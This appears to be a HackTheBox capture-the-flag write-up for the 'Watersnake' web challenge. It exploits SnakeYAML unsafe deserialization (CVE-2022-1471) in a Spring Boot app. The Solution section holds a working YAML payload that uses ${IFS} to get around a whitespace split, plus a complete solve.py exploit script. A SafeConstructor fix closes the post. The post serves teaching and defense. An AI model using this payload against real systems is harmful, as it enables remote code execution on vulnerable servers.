---
layout: post
title: "Watersnake"
date: 2027-07-30 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, yaml-deserialization, snakeyaml, java, spring-boot, CVE-2022-1471, CWE-502]
---

## Overview

Watersnake is an Easy HTB Web challenge built on a Spring Boot 3.0 app using SnakeYAML 1.33. A [deserialization of untrusted data](https://cwe.mitre.org/data/definitions/502.html) vulnerability in the `POST /update` endpoint allows an attacker to instantiate any Java class on the classpath via `!!classname` YAML tags. The app ships a local gadget class (`GetWaterLevel`) whose constructor feeds user input directly into `ProcessBuilder` — no remote JAR or JNDI server needed. Overwriting the bundled `watersensor` binary with a shell script makes the `/stats` endpoint return the flag.

---

## The Technique

[CVE-2022-1471](https://nvd.nist.gov/vuln/detail/CVE-2022-1471) — SnakeYAML's `Yaml.load()` (without a `SafeConstructor`) trusts `!!classname` YAML tags and calls the named class's constructor with the supplied arguments at parse time.

The controller passes raw user input straight to the loader:

```java
// POST /update — Controller.java
Yaml yaml = new Yaml();                       // no SafeConstructor
Map<String,Object> obj = yaml.load(is);       // arbitrary type instantiation
```

The app also ships `GetWaterLevel`, whose constructor is a ready-made process-execution gadget:

```java
public GetWaterLevel(String value) {
    initiateSensor(value);              // → readFromSensor(value)
}
public static String readFromSensor(String value) throws IOException {
    ProcessBuilder pb = new ProcessBuilder(value.split("\\s+"));
    // reads stdout, returns it to the caller
}
```

**Key constraint:** `value.split("\\s+")` splits on every whitespace character, so the command string embedded in the YAML tag must have no interior spaces. The bypass: use `${IFS}` inside shell script content — the variable expands to a space (the default field separator) when the script is executed by `/bin/sh`, but the characters `$`, `{`, `I`, `F`, `S`, `}` contain no whitespace in the source.

**Output problem:** `initiateSensor()` discards the return value of `readFromSensor()` (blind execution). But the `/stats` endpoint calls `readFromSensor("./watersensor --stats")` directly and returns its stdout to the HTTP response. So the attack replaces the `watersensor` binary with a shell script, then calls `/stats` to read the output.

---

## Solution

Two requests solve the challenge.

**Step 1 — Overwrite `/app/watersensor` via Python (space-free one-liner):**

```yaml
a: !!com.lean.watersnake.GetWaterLevel ['python3 -c open("/app/watersensor","wb").write(b"#!/bin/sh\ncat${IFS}/flag.txt")']
```

After `split("\\s+")` this becomes `["python3", "-c", "open(...).write(...)"]` — only the two word-boundary spaces are removed; the Python code arg itself is space-free.

Python writes to `/app/watersensor`:

```
#!/bin/sh
cat${IFS}/flag.txt
```

The original binary is executable, so overwriting its content preserves the execute bit — no `chmod` needed.

**Step 2 — Trigger `/stats` to return the flag:**

The controller runs `./watersensor --stats`. Our shell script is now invoked by `/bin/sh`, expanding `${IFS}` to a space → `cat /flag.txt` → outputs the flag → captured and returned by `readFromSensor()`.

**`solve.py`:**

```python
#!/usr/bin/env python3
"""
HTB Watersnake - SnakeYAML deserialization RCE (CVE-2022-1471)
Technique: local class gadget + watersensor binary replacement
"""
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "localhost:1337"
BASE_URL = f"http://{TARGET}"

def update(config_yaml: str) -> str:
    r = requests.post(f"{BASE_URL}/update", data={"config": config_yaml})
    return r.text

YAML_WRITE_WATERSENSOR = (
    'a: !!com.lean.watersnake.GetWaterLevel '
    "['python3 -c open(\"/app/watersensor\",\"wb\").write(b\"#!/bin/sh\\ncat${IFS}/flag.txt\")']"
)
print("[*] Overwriting watersensor with shell script...")
resp = update(YAML_WRITE_WATERSENSOR)
print(f"    Response: {resp}")

print("[*] Calling /stats to execute modified watersensor...")
r = requests.get(f"{BASE_URL}/stats")
print(f"[+] FLAG: {r.text.strip()}")
```

Running `python3 solve.py <host>:<port>` returns:

```
[*] Overwriting watersensor with shell script...
    Response: Config queued for firmware update
[*] Calling /stats to execute modified watersensor...
[+] FLAG: HTB{...}
```

---

## Why It Worked

1. `Yaml.load()` without `SafeConstructor` processes `!!classname` tags by design — this is the documented behaviour SnakeYAML inherited from its YAML 1.1 spec interpretation, patched in [CVE-2022-1471](https://nvd.nist.gov/vuln/detail/CVE-2022-1471) / SnakeYAML 2.0.
2. `GetWaterLevel`'s constructor immediately hands the YAML-supplied string to `ProcessBuilder` — making it a local-class gadget that requires nothing external (no JNDI, no remote URL).
3. Java `String.split("\\s+")` splits on whitespace, but `${IFS}` is not whitespace in the Java string — it's five literal characters that the downstream shell expands to a space during script execution.
4. Overwriting an existing executable file in-place preserves its inode permissions; the kernel will still treat the file as executable on the next `execve` call.

---

## Fix / Defense

Use `SafeConstructor` to reject all `!!` type tags:

```java
import org.yaml.snakeyaml.constructor.SafeConstructor;
import org.yaml.snakeyaml.LoaderOptions;

Yaml yaml = new Yaml(new SafeConstructor(new LoaderOptions()));
Map<String,Object> obj = yaml.load(is);   // !! tags are now rejected
```

Or upgrade to **SnakeYAML ≥ 2.0**, where `SafeConstructor` is the default and arbitrary type instantiation requires an explicit opt-in. The root cause is accepting a Java object graph from untrusted serialized input — the same principle that drives [CWE-502](https://cwe.mitre.org/data/definitions/502.html) across PHP `unserialize()`, Python `pickle.loads()`, and Java `ObjectInputStream`.
